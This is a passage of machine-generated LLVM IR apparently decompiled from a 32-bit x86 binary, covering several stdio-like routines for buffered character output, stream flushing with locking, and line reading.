dec_label_pc_804cd01:                             ; preds = %dec_label_pc_804ccd8, %dec_label_pc_804ccf0
  %v0_804cd04 = phi i32 [ %v5_804cce2, %dec_label_pc_804ccd8 ], [ %v0_804cd04.pre, %dec_label_pc_804ccf0 ]
  store i32 %v0_804ccaa, i32* @ebx, align 4
  store i32 %v0_804cca9, i32* @esi, align 4
  store i32 %v0_804cca8, i32* @edi, align 4
  ret i32 %v0_804cd04

; uselistorder directives
  uselistorder i32 %v12_804ccab, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804cd01, { 1, 0 }
  uselistorder label %dec_label_pc_804ccd8, { 1, 0 }
}

define i32 @function_804cd0c(i8 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804cd0c:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804cd0c = load i32, i32* @edi, align 4
  %v0_804cd0d = load i32, i32* @esi, align 4
  %v0_804cd0e = load i32, i32* @ebx, align 4
  %v12_804cd0f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v4_804cd16 = sext i8 %arg1 to i32
  store i32 %v4_804cd16, i32* @edi, align 4
  %v1_804cd1a = add i32 %arg2, 52
  %v2_804cd1a = inttoptr i32 %v1_804cd1a to i32*
  %v3_804cd1a = load i32, i32* %v2_804cd1a, align 4
  %v4_804cd1a = icmp eq i32 %v3_804cd1a, 0
  br i1 %v4_804cd1a, label %dec_label_pc_804cd42, label %dec_label_pc_804cd20

dec_label_pc_804cd20:                             ; preds = %dec_label_pc_804cd0c
  %v1_804cd20 = add i32 %arg2, 16
  %v2_804cd20 = inttoptr i32 %v1_804cd20 to i32*
  %v3_804cd20 = load i32, i32* %v2_804cd20, align 4
  store i32 %v3_804cd20, i32* %eax.global-to-local, align 4
  %v2_804cd23 = add i32 %arg2, 28
  %v3_804cd23 = inttoptr i32 %v2_804cd23 to i32*
  %v4_804cd23 = load i32, i32* %v3_804cd23, align 4
  %v10_804cd23 = icmp ult i32 %v3_804cd20, %v4_804cd23
  %v1_804cd26 = icmp eq i1 %v10_804cd23, false
  br i1 %v1_804cd26, label %dec_label_pc_804cd35, label %dec_label_pc_804cd28

dec_label_pc_804cd28:                             ; preds = %dec_label_pc_804cd20
  store i32 %v4_804cd16, i32* %edx.global-to-local, align 4
  %v3_804cd2a = inttoptr i32 %v3_804cd20 to i8*
  store i8 %arg1, i8* %v3_804cd2a, align 1
  %v0_804cd2c = load i32, i32* %edx.global-to-local, align 4
  %v1_804cd2c = urem i32 %v0_804cd2c, 256
  store i32 %v1_804cd2c, i32* %ebx.global-to-local, align 4
  %v0_804cd2f = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd2f = add i32 %v0_804cd2f, 1
  store i32 %v1_804cd2f, i32* %eax.global-to-local, align 4
  %v1_804cd30 = load i32, i32* @esi, align 4
  %v2_804cd30 = add i32 %v1_804cd30, 16
  %v3_804cd30 = inttoptr i32 %v2_804cd30 to i32*
  store i32 %v1_804cd2f, i32* %v3_804cd30, align 4
  br label %dec_label_pc_804cd95

dec_label_pc_804cd35:                             ; preds = %dec_label_pc_804cd20
  %v4_804cd39 = call i32 @function_804d040(i8 %arg1, i32 %arg2)
  store i32 %v4_804cd39, i32* %eax.global-to-local, align 4
  store i32 %v4_804cd39, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cd92

dec_label_pc_804cd42:                             ; preds = %dec_label_pc_804cd0c
  %v1_804cd42 = add i32 %arg2, 56
  store i32 %v1_804cd42, i32* @ebx, align 4
  store i32 %v12_804cd0f, i32* @eax, align 4
  %sext = mul i32 %v12_804cd0f, 16777216
  %v1_804cd51 = sdiv i32 %sext, 16777216
  %v3_804cd51 = call i32 @function_804f016(i32 %v1_804cd51, i32 134541331)
  store i32 %v3_804cd51, i32* %eax.global-to-local, align 4
  %v0_804cd56 = load i32, i32* @ebx, align 4
  %sext3 = mul i32 %v0_804cd56, 16777216
  %v1_804cd59 = sdiv i32 %sext3, 16777216
  %v2_804cd59 = call i32 @function_804f013(i32 %v1_804cd59)
  store i32 %v2_804cd59, i32* %eax.global-to-local, align 4
  %v0_804cd5e = load i32, i32* @esi, align 4
  %v1_804cd5e = add i32 %v0_804cd5e, 16
  %v2_804cd5e = inttoptr i32 %v1_804cd5e to i32*
  %v3_804cd5e = load i32, i32* %v2_804cd5e, align 4
  store i32 %v3_804cd5e, i32* %eax.global-to-local, align 4
  %v2_804cd64 = add i32 %v0_804cd5e, 28
  %v3_804cd64 = inttoptr i32 %v2_804cd64 to i32*
  %v4_804cd64 = load i32, i32* %v3_804cd64, align 4
  %v10_804cd64 = icmp ult i32 %v3_804cd5e, %v4_804cd64
  %v1_804cd67 = icmp eq i1 %v10_804cd64, false
  %v0_804cd79 = load i32, i32* @edi, align 4
  br i1 %v1_804cd67, label %dec_label_pc_804cd76, label %dec_label_pc_804cd69

dec_label_pc_804cd69:                             ; preds = %dec_label_pc_804cd42
  store i32 %v0_804cd79, i32* %edx.global-to-local, align 4
  %v1_804cd6b = trunc i32 %v0_804cd79 to i8
  %v3_804cd6b = inttoptr i32 %v3_804cd5e to i8*
  store i8 %v1_804cd6b, i8* %v3_804cd6b, align 1
  %v0_804cd6d = load i32, i32* %edx.global-to-local, align 4
  %v1_804cd6d = urem i32 %v0_804cd6d, 256
  store i32 %v1_804cd6d, i32* %ebx.global-to-local, align 4
  %v0_804cd70 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd70 = add i32 %v0_804cd70, 1
  store i32 %v1_804cd70, i32* %eax.global-to-local, align 4
  %v1_804cd71 = load i32, i32* @esi, align 4
  %v2_804cd71 = add i32 %v1_804cd71, 16
  %v3_804cd71 = inttoptr i32 %v2_804cd71 to i32*
  store i32 %v1_804cd70, i32* %v3_804cd71, align 4
  br label %dec_label_pc_804cd84

dec_label_pc_804cd76:                             ; preds = %dec_label_pc_804cd42
  %v5_804cd79 = trunc i32 %v0_804cd79 to i8
  %v4_804cd7a = call i32 @function_804d040(i8 %v5_804cd79, i32 %v0_804cd5e)
  store i32 %v4_804cd7a, i32* %eax.global-to-local, align 4
  store i32 %v4_804cd7a, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cd84

dec_label_pc_804cd84:                             ; preds = %dec_label_pc_804cd69, %dec_label_pc_804cd76
  store i32 %v12_804cd0f, i32* @eax, align 4
  %v3_804cd8d = call i32 @function_804f016(i32 %v1_804cd51, i32 1)
  store i32 %v3_804cd8d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd92

dec_label_pc_804cd92:                             ; preds = %dec_label_pc_804cd35, %dec_label_pc_804cd84
  br label %dec_label_pc_804cd95

dec_label_pc_804cd95:                             ; preds = %dec_label_pc_804cd28, %dec_label_pc_804cd92
  %v0_804cd98 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804cd98, i32* %eax.global-to-local, align 4
  store i32 %v0_804cd0e, i32* @ebx, align 4
  store i32 %v0_804cd0d, i32* @esi, align 4
  store i32 %v0_804cd0c, i32* @edi, align 4
  ret i32 %v0_804cd98

; uselistorder directives
  uselistorder i32 %v0_804cd79, { 2, 1, 0 }
  uselistorder i32 %v1_804cd51, { 1, 0 }
  uselistorder i32 %v12_804cd0f, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_804cd95, { 1, 0 }
  uselistorder label %dec_label_pc_804cd92, { 1, 0 }
  uselistorder label %dec_label_pc_804cd84, { 1, 0 }
}

define i32 @function_804cda0() local_unnamed_addr {
dec_label_pc_804cda0:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804cdaf = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804cdaf, i32* @eax, align 4
  %v2_804cdb4 = call i32 @function_804f016(i32 %v2_804cdaf, i32 134541331)
  %v1_804cdc0 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055b78.107 to i32))
  %v0_804cdc5 = load i32, i32* @global_var_8056240.108, align 64
  %v8_804cdcd = icmp eq i32 %v0_804cdc5, 1
  %v1_804cdce = icmp eq i1 %v8_804cdcd, false
  br i1 %v1_804cdce, label %dec_label_pc_804ce65, label %dec_label_pc_804cdd4

dec_label_pc_804cdd4:                             ; preds = %dec_label_pc_804cda0
  %v0_804cdd4 = load i32, i32* @global_var_8056244.109, align 4
  %tmp29 = icmp slt i32 %v0_804cdd4, 1
  br i1 %tmp29, label %dec_label_pc_804ce65, label %dec_label_pc_804cde1

dec_label_pc_804cde1:                             ; preds = %dec_label_pc_804cdd4
  store i32 0, i32* @esi, align 4
  %v2_804cdee = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804cdee, i32* @eax, align 4
  %v2_804cdf3 = call i32 @function_804f016(i32 %v2_804cdee, i32 134541331)
  %v1_804cdff = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055b60.116 to i32))
  %v0_804ce04 = load i32, i32* bitcast (i32** @global_var_8055b5c.117 to i32*), align 4
  store i32 %v0_804ce04, i32* %edx.global-to-local, align 4
  %v1_804ce463 = icmp eq i32 %v0_804ce04, 0
  %v1_804ce4810 = icmp eq i1 %v1_804ce463, false
  br i1 %v1_804ce4810, label %dec_label_pc_804ce0f, label %dec_label_pc_804ce4a

dec_label_pc_804ce0f:                             ; preds = %dec_label_pc_804cde1, %dec_label_pc_804ce44
  %v1_804ce0f14.in = phi i32 [ %v0_804ce44, %dec_label_pc_804ce44 ], [ %v0_804ce04, %dec_label_pc_804cde1 ]
  %v1_804ce0f14 = inttoptr i32 %v1_804ce0f14.in to i16*
  %v2_804ce0f = load i16, i16* %v1_804ce0f14, align 2
  %v1_804ce12 = add i32 %v1_804ce0f14.in, 32
  %v2_804ce12 = inttoptr i32 %v1_804ce12 to i32*
  %v3_804ce12 = load i32, i32* %v2_804ce12, align 4
  store i32 %v3_804ce12, i32* @ebx, align 4
  %v1_804ce15 = and i16 %v2_804ce0f, -32720
  %v6_804ce1a = icmp eq i16 %v1_804ce15, 48
  br i1 %v6_804ce1a, label %dec_label_pc_804ce23, label %dec_label_pc_804ce1f

dec_label_pc_804ce1f:                             ; preds = %dec_label_pc_804ce0f
  store i32 %v1_804ce0f14.in, i32* @esi, align 4
  br label %dec_label_pc_804ce44

dec_label_pc_804ce23:                             ; preds = %dec_label_pc_804ce0f
  %v0_804ce23 = load i32, i32* @esi, align 4
  %v1_804ce23 = icmp eq i32 %v0_804ce23, 0
  %v1_804ce25 = icmp eq i1 %v1_804ce23, false
  br i1 %v1_804ce25, label %dec_label_pc_804ce2f, label %dec_label_pc_804ce27

dec_label_pc_804ce27:                             ; preds = %dec_label_pc_804ce23
  store i32 %v3_804ce12, i32* bitcast (i32** @global_var_8055b5c.117 to i32*), align 4
  br label %dec_label_pc_804ce32

dec_label_pc_804ce2f:                             ; preds = %dec_label_pc_804ce23
  %v2_804ce2f = add i32 %v0_804ce23, 32
  %v3_804ce2f = inttoptr i32 %v2_804ce2f to i32*
  store i32 %v3_804ce12, i32* %v3_804ce2f, align 4
  %v0_804ce32.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ce32

dec_label_pc_804ce32:                             ; preds = %dec_label_pc_804ce27, %dec_label_pc_804ce2f
  %v0_804ce3b = phi i32 [ %v1_804ce0f14.in, %dec_label_pc_804ce27 ], [ %v0_804ce32.pre, %dec_label_pc_804ce2f ]
  %v1_804ce32 = add i32 %v0_804ce3b, 1
  %v2_804ce32 = inttoptr i32 %v1_804ce32 to i8*
  %v3_804ce32 = load i8, i8* %v2_804ce32, align 1
  %v4_804ce32 = and i8 %v3_804ce32, 32
  %v5_804ce32 = icmp eq i8 %v4_804ce32, 0
  br i1 %v5_804ce32, label %dec_label_pc_804ce44, label %dec_label_pc_804ce38

dec_label_pc_804ce38:                             ; preds = %dec_label_pc_804ce32
  %v1_804ce3c = call i32 @function_804e481(i32 %v0_804ce3b)
  br label %dec_label_pc_804ce44

dec_label_pc_804ce44:                             ; preds = %dec_label_pc_804ce32, %dec_label_pc_804ce1f, %dec_label_pc_804ce38
  %v0_804ce44 = load i32, i32* @ebx, align 4
  store i32 %v0_804ce44, i32* %edx.global-to-local, align 4
  %v1_804ce46 = icmp eq i32 %v0_804ce44, 0
  %v1_804ce48 = icmp eq i1 %v1_804ce46, false
  br i1 %v1_804ce48, label %dec_label_pc_804ce0f, label %dec_label_pc_804ce4a

dec_label_pc_804ce4a:                             ; preds = %dec_label_pc_804ce44, %dec_label_pc_804cde1
  store i32 %v2_804cdee, i32* @eax, align 4
  %v2_804ce53 = call i32 @function_804f016(i32 %v2_804cdee, i32 1)
  store i32 0, i32* @global_var_8056244.109, align 4
  %v0_804ce65.pre = load i32, i32* @global_var_8056240.108, align 64
  br label %dec_label_pc_804ce65

dec_label_pc_804ce65:                             ; preds = %dec_label_pc_804cdd4, %dec_label_pc_804cda0, %dec_label_pc_804ce4a
  %v0_804ce65 = phi i32 [ %v0_804cdc5, %dec_label_pc_804cdd4 ], [ %v0_804cdc5, %dec_label_pc_804cda0 ], [ %v0_804ce65.pre, %dec_label_pc_804ce4a ]
  %v1_804ce6a = add i32 %v0_804ce65, -1
  store i32 %v1_804ce6a, i32* @global_var_8056240.108, align 64
  store i32 %v2_804cdaf, i32* @eax, align 4
  %v2_804ce79 = call i32 @function_804f016(i32 %v2_804cdaf, i32 1)
  ret i32 %v2_804ce79

; uselistorder directives
  uselistorder i32 %v0_804ce44, { 1, 2, 0 }
  uselistorder i32 %v1_804ce0f14.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804cdc5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804ce65, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ce44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ce32, { 1, 0 }
  uselistorder label %dec_label_pc_804ce0f, { 1, 0 }
}

define i32 @function_804ce84(i16* %arg1) local_unnamed_addr {
dec_label_pc_804ce84:
  %stack_var_-32 = alloca i32, align 4
  %v0_804ce84 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_804ce87 = load i32, i32* @edi, align 4
  %v0_804ce88 = load i32, i32* @esi, align 4
  %v0_804ce89 = load i32, i32* @ebx, align 4
  %v4_804ce8d = ptrtoint i16* %arg1 to i32
  store i32 %v4_804ce8d, i32* @ebx, align 4
  %v10_804ce91 = icmp eq i16* %arg1, inttoptr (i32 134568796 to i16*)
  br i1 %v10_804ce91, label %dec_label_pc_804cea5, label %dec_label_pc_804ce99

dec_label_pc_804ce99:                             ; preds = %dec_label_pc_804ce84
  %v2_804ce99 = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_804ce9f = icmp eq i1 %v2_804ce99, false
  br i1 %v1_804ce9f, label %dec_label_pc_804cf9d, label %dec_label_pc_804cea5

dec_label_pc_804cea5:                             ; preds = %dec_label_pc_804ce99, %dec_label_pc_804ce84
  store i32 0, i32* @edi, align 4
  %v2_804ceb2 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ceb2, i32* @ebx, align 4
  %v2_804ceb7 = call i32 @function_804f016(i32 %v2_804ceb2, i32 134541331)
  %v1_804cec3 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055b78.107 to i32))
  %v0_804cec8 = load i32, i32* @global_var_8056240.108, align 64
  store i32 ptrtoint (i32* @global_var_8055b78.107 to i32), i32* @ecx, align 4
  %v1_804cecf = add i32 %v0_804cec8, 1
  store i32 %v1_804cecf, i32* @eax, align 4
  store i32 %v1_804cecf, i32* @global_var_8056240.108, align 64
  %v2_804ced8 = call i32 @function_804f016(i32 %v2_804ceb2, i32 1)
  store i32 %v2_804ced8, i32* @eax, align 4
  %v2_804ceeb = call i32 @function_804f016(i32 %v2_804ceb2, i32 134541331)
  %v1_804cef7 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055b60.116 to i32))
  %v0_804cefc = load i32, i32* bitcast (i32** @global_var_8055b5c.117 to i32*), align 4
  store i32 %v0_804cefc, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_8055b60.116 to i32), i32* @eax, align 4
  %v2_804cf07 = call i32 @function_804f016(i32 %v2_804ceb2, i32 1)
  %v0_804cf8e2 = load i32, i32* @esi, align 4
  %v1_804cf8e3 = icmp eq i32 %v0_804cf8e2, 0
  %v1_804cf9010 = icmp eq i1 %v1_804cf8e3, false
  br i1 %v1_804cf9010, label %dec_label_pc_804cf11, label %dec_label_pc_804cf96

dec_label_pc_804cf11:                             ; preds = %dec_label_pc_804cea5, %dec_label_pc_804cf8b
  %v0_804cf1f = phi i32 [ %v3_804cf8b, %dec_label_pc_804cf8b ], [ %v0_804cf8e2, %dec_label_pc_804cea5 ]
  %v1_804cf11 = inttoptr i32 %v0_804cf1f to i8*
  %v2_804cf11 = load i8, i8* %v1_804cf11, align 1
  %v3_804cf11 = and i8 %v2_804cf11, 64
  %v4_804cf11 = icmp eq i8 %v3_804cf11, 0
  br i1 %v4_804cf11, label %dec_label_pc_804cf8b, label %dec_label_pc_804cf16

dec_label_pc_804cf16:                             ; preds = %dec_label_pc_804cf11
  %v0_804cf16 = load i32, i32* @global_var_8055b90.115, align 16
  %v9_804cf16 = icmp eq i32 %v0_804cf16, 2
  br i1 %v9_804cf16, label %dec_label_pc_804cf3e, label %dec_label_pc_804cf1f

dec_label_pc_804cf1f:                             ; preds = %dec_label_pc_804cf16
  %v1_804cf1f = add i32 %v0_804cf1f, 56
  store i32 %v1_804cf1f, i32* @ebx, align 4
  store i32 %v2_804ceb2, i32* @eax, align 4
  %v2_804cf2e = call i32 @function_804f016(i32 %v2_804ceb2, i32 134541331)
  %v0_804cf33 = load i32, i32* @ebx, align 4
  %v1_804cf36 = call i32 @function_804f013(i32 %v0_804cf33)
  %v0_804cf3e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cf3e

dec_label_pc_804cf3e:                             ; preds = %dec_label_pc_804cf16, %dec_label_pc_804cf1f
  %v0_804cf51 = phi i32 [ %v0_804cf1f, %dec_label_pc_804cf16 ], [ %v0_804cf3e.pre, %dec_label_pc_804cf1f ]
  %v1_804cf3e = inttoptr i32 %v0_804cf51 to i32*
  %v2_804cf3e = load i32, i32* %v1_804cf3e, align 4
  %v1_804cf40 = load i32, i32* @ebp, align 4
  %v2_804cf40 = or i32 %v1_804cf40, %v2_804cf3e
  %v1_804cf42 = and i32 %v2_804cf40, 832
  %v2_804cf47 = icmp eq i32 %v1_804cf42, 320
  %v1_804cf4c = icmp eq i1 %v2_804cf47, false
  br i1 %v1_804cf4c, label %dec_label_pc_804cf71, label %dec_label_pc_804cf4e

dec_label_pc_804cf4e:                             ; preds = %dec_label_pc_804cf3e
  %v1_804cf52 = call i32 @function_804c010(i32 %v0_804cf51)
  %v1_804cf5a = icmp eq i32 %v1_804cf52, 0
  br i1 %v1_804cf5a, label %dec_label_pc_804cf63, label %dec_label_pc_804cf5e

dec_label_pc_804cf5e:                             ; preds = %dec_label_pc_804cf4e
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804cf71

dec_label_pc_804cf63:                             ; preds = %dec_label_pc_804cf4e
  %v0_804cf63 = load i32, i32* @esi, align 4
  %v1_804cf63 = add i32 %v0_804cf63, 8
  %v2_804cf63 = inttoptr i32 %v1_804cf63 to i32*
  %v3_804cf63 = load i32, i32* %v2_804cf63, align 4
  %v2_804cf66 = add i32 %v0_804cf63, 28
  %v3_804cf66 = inttoptr i32 %v2_804cf66 to i32*
  store i32 %v3_804cf63, i32* %v3_804cf66, align 4
  %v0_804cf69 = load i32, i32* @esi, align 4
  %v1_804cf69 = inttoptr i32 %v0_804cf69 to i32*
  %v2_804cf69 = load i32, i32* %v1_804cf69, align 4
  %v2_804cf69.tr = trunc i32 %v2_804cf69 to i16
  %v1_804cf6e = and i16 %v2_804cf69.tr, -65
  %v3_804cf6e = inttoptr i32 %v0_804cf69 to i16*
  store i16 %v1_804cf6e, i16* %v3_804cf6e, align 2
  br label %dec_label_pc_804cf71

dec_label_pc_804cf71:                             ; preds = %dec_label_pc_804cf3e, %dec_label_pc_804cf5e, %dec_label_pc_804cf63
  %v0_804cf71 = load i32, i32* @global_var_8055b90.115, align 16
  %v9_804cf71 = icmp eq i32 %v0_804cf71, 2
  br i1 %v9_804cf71, label %dec_label_pc_804cf8b, label %dec_label_pc_804cf7a

dec_label_pc_804cf7a:                             ; preds = %dec_label_pc_804cf71
  store i32 %v2_804ceb2, i32* @eax, align 4
  %v2_804cf83 = call i32 @function_804f016(i32 %v2_804ceb2, i32 1)
  br label %dec_label_pc_804cf8b

dec_label_pc_804cf8b:                             ; preds = %dec_label_pc_804cf71, %dec_label_pc_804cf11, %dec_label_pc_804cf7a
  %v0_804cf8b = load i32, i32* @esi, align 4
  %v1_804cf8b = add i32 %v0_804cf8b, 32
  %v2_804cf8b = inttoptr i32 %v1_804cf8b to i32*
  %v3_804cf8b = load i32, i32* %v2_804cf8b, align 4
  store i32 %v3_804cf8b, i32* @esi, align 4
  %v1_804cf8e = icmp eq i32 %v3_804cf8b, 0
  %v1_804cf90 = icmp eq i1 %v1_804cf8e, false
  br i1 %v1_804cf90, label %dec_label_pc_804cf11, label %dec_label_pc_804cf96

dec_label_pc_804cf96:                             ; preds = %dec_label_pc_804cf8b, %dec_label_pc_804cea5
  %v0_804cf96 = call i32 @function_804cda0()
  br label %dec_label_pc_804cfc7

dec_label_pc_804cf9d:                             ; preds = %dec_label_pc_804ce99
  store i32 0, i32* @edi, align 4
  %tmp24 = bitcast i16* %arg1 to i8*
  %v3_804cf9f = load i8, i8* %tmp24, align 1
  %v4_804cf9f = and i8 %v3_804cf9f, 64
  %v5_804cf9f = icmp eq i8 %v4_804cf9f, 0
  br i1 %v5_804cf9f, label %dec_label_pc_804cfc7, label %dec_label_pc_804cfa4

dec_label_pc_804cfa4:                             ; preds = %dec_label_pc_804cf9d
  store i32 -1, i32* @edi, align 4
  %v1_804cfab = call i32 @function_804c010(i32 %v4_804ce8d)
  %v1_804cfb3 = icmp eq i32 %v1_804cfab, 0
  %v1_804cfb5 = icmp eq i1 %v1_804cfb3, false
  br i1 %v1_804cfb5, label %dec_label_pc_804cfc7, label %dec_label_pc_804cfb7

dec_label_pc_804cfb7:                             ; preds = %dec_label_pc_804cfa4
  %v2_804cfb7 = add i32 %v4_804ce8d, 8
  %v3_804cfb7 = inttoptr i32 %v2_804cfb7 to i32*
  %v4_804cfb7 = load i32, i32* %v3_804cfb7, align 4
  store i32 0, i32* @edi, align 4
  %v3_804cfbc = add i32 %v4_804ce8d, 28
  %v4_804cfbc = inttoptr i32 %v3_804cfbc to i32*
  store i32 %v4_804cfb7, i32* %v4_804cfbc, align 4
  %tmp25 = bitcast i16* %arg1 to i32*
  %v3_804cfbf = load i32, i32* %tmp25, align 4
  %v3_804cfbf.tr = trunc i32 %v3_804cfbf to i16
  %v1_804cfc4 = and i16 %v3_804cfbf.tr, -65
  store i16 %v1_804cfc4, i16* %arg1, align 2
  br label %dec_label_pc_804cfc7

dec_label_pc_804cfc7:                             ; preds = %dec_label_pc_804cfa4, %dec_label_pc_804cf9d, %dec_label_pc_804cf96, %dec_label_pc_804cfb7
  %v0_804cfca = load i32, i32* @edi, align 4
  store i32 %v0_804ce89, i32* @ebx, align 4
  store i32 %v0_804ce88, i32* @esi, align 4
  store i32 %v0_804ce87, i32* @edi, align 4
  store i32 %v0_804ce84, i32* @ebp, align 4
  ret i32 %v0_804cfca

; uselistorder directives
  uselistorder i32 %v3_804cf8b, { 1, 2, 0 }
  uselistorder i32 %v2_804ceb2, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @function_804cda0, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8055b5c.117 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_8056240.108, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8055b78.107 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 2, 1, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_804cfc7, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804cf8b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cf71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804cf3e, { 1, 0 }
  uselistorder label %dec_label_pc_804cf11, { 1, 0 }
}

define i32 @function_804cfd4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804cfd4:
  %eax.global-to-local = alloca i32, align 4
  %v0_804cfd4 = load i32, i32* @ebp, align 4
  %v4_804cfdf = ptrtoint i8* %arg1 to i32
  store i32 %v4_804cfdf, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804cfdf, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804d025.preheader, label %dec_label_pc_804d031

dec_label_pc_804d025.preheader:                   ; preds = %dec_label_pc_804cfd4
  %v1_804d02519 = add i32 %arg2, -1
  %v8_804d02520 = icmp eq i32 %v1_804d02519, 0
  store i32 %v1_804d02519, i32* @esi, align 4
  %v1_804d02622 = icmp eq i1 %v8_804d02520, false
  br i1 %v1_804d02622, label %dec_label_pc_804cfef, label %dec_label_pc_804d028

dec_label_pc_804cfef:                             ; preds = %dec_label_pc_804d025.preheader, %dec_label_pc_804d023.dec_label_pc_804d025_crit_edge.dec_label_pc_804cfef_crit_edge
  %v0_804cfef = phi i32 [ %v0_804cfef.pre, %dec_label_pc_804d023.dec_label_pc_804d025_crit_edge.dec_label_pc_804cfef_crit_edge ], [ %arg3, %dec_label_pc_804d025.preheader ]
  %v1_804cfef = add i32 %v0_804cfef, 16
  %v2_804cfef = inttoptr i32 %v1_804cfef to i32*
  %v3_804cfef = load i32, i32* %v2_804cfef, align 4
  store i32 %v3_804cfef, i32* %eax.global-to-local, align 4
  %v2_804cff2 = add i32 %v0_804cfef, 24
  %v3_804cff2 = inttoptr i32 %v2_804cff2 to i32*
  %v4_804cff2 = load i32, i32* %v3_804cff2, align 4
  %v10_804cff2 = icmp ult i32 %v3_804cfef, %v4_804cff2
  %v1_804cff5 = icmp eq i1 %v10_804cff2, false
  br i1 %v1_804cff5, label %dec_label_pc_804d005, label %dec_label_pc_804cff7

dec_label_pc_804cff7:                             ; preds = %dec_label_pc_804cfef
  %v1_804cff7 = inttoptr i32 %v3_804cfef to i8*
  %v2_804cff7 = load i8, i8* %v1_804cff7, align 1
  %v3_804cff7 = zext i8 %v2_804cff7 to i32
  %v4_804cff7 = load i32, i32* @edx, align 4
  %v5_804cff7 = and i32 %v4_804cff7, -256
  %v6_804cff7 = or i32 %v5_804cff7, %v3_804cff7
  store i32 %v6_804cff7, i32* @edx, align 4
  %v1_804cff9 = add i32 %v3_804cfef, 1
  store i32 %v1_804cff9, i32* %eax.global-to-local, align 4
  %v2_804cffa = load i32, i32* @ebx, align 4
  %v3_804cffa = inttoptr i32 %v2_804cffa to i8*
  store i8 %v2_804cff7, i8* %v3_804cffa, align 1
  %v0_804cffc = load i32, i32* @ebx, align 4
  %v1_804cffc = add i32 %v0_804cffc, 1
  store i32 %v1_804cffc, i32* @ebx, align 4
  %v0_804cffd = load i32, i32* @edx, align 4
  %v1_804cffd = trunc i32 %v0_804cffd to i8
  %v10_804cffd = icmp eq i8 %v1_804cffd, 10
  %v0_804d000 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d000 = load i32, i32* @ebp, align 4
  %v2_804d000 = add i32 %v1_804d000, 16
  %v3_804d000 = inttoptr i32 %v2_804d000 to i32*
  store i32 %v0_804d000, i32* %v3_804d000, align 4
  br i1 %v10_804cffd, label %dec_label_pc_804d028, label %dec_label_pc_804d023.dec_label_pc_804d025_crit_edge

dec_label_pc_804d005:                             ; preds = %dec_label_pc_804cfef
  %v0_804d009 = call i32 @function_805027c()
  %v1_804d009 = trunc i32 %v0_804d009 to i8
  store i32 %v0_804d009, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_804d009, 256
  %v11_804d011 = icmp eq i32 %sext.mask, 255
  %v1_804d014 = icmp eq i1 %v11_804d011, false
  br i1 %v1_804d014, label %dec_label_pc_804d023, label %dec_label_pc_804d016

dec_label_pc_804d016:                             ; preds = %dec_label_pc_804d005
  %v0_804d016 = load i32, i32* @ebp, align 4
  %v1_804d016 = inttoptr i32 %v0_804d016 to i8*
  %v2_804d016 = load i8, i8* %v1_804d016, align 1
  %v3_804d016 = and i8 %v2_804d016, 8
  %v4_804d016 = icmp eq i8 %v3_804d016, 0
  br i1 %v4_804d016, label %dec_label_pc_804d028, label %dec_label_pc_804d031

dec_label_pc_804d023:                             ; preds = %dec_label_pc_804d005
  %v3_804d01e = load i32, i32* @ebx, align 4
  %v4_804d01e = inttoptr i32 %v3_804d01e to i8*
  store i8 %v1_804d009, i8* %v4_804d01e, align 1
  %v0_804d020 = load i32, i32* @ebx, align 4
  %v1_804d020 = add i32 %v0_804d020, 1
  store i32 %v1_804d020, i32* @ebx, align 4
  %v11_804d021 = icmp eq i8 %v1_804d009, 10
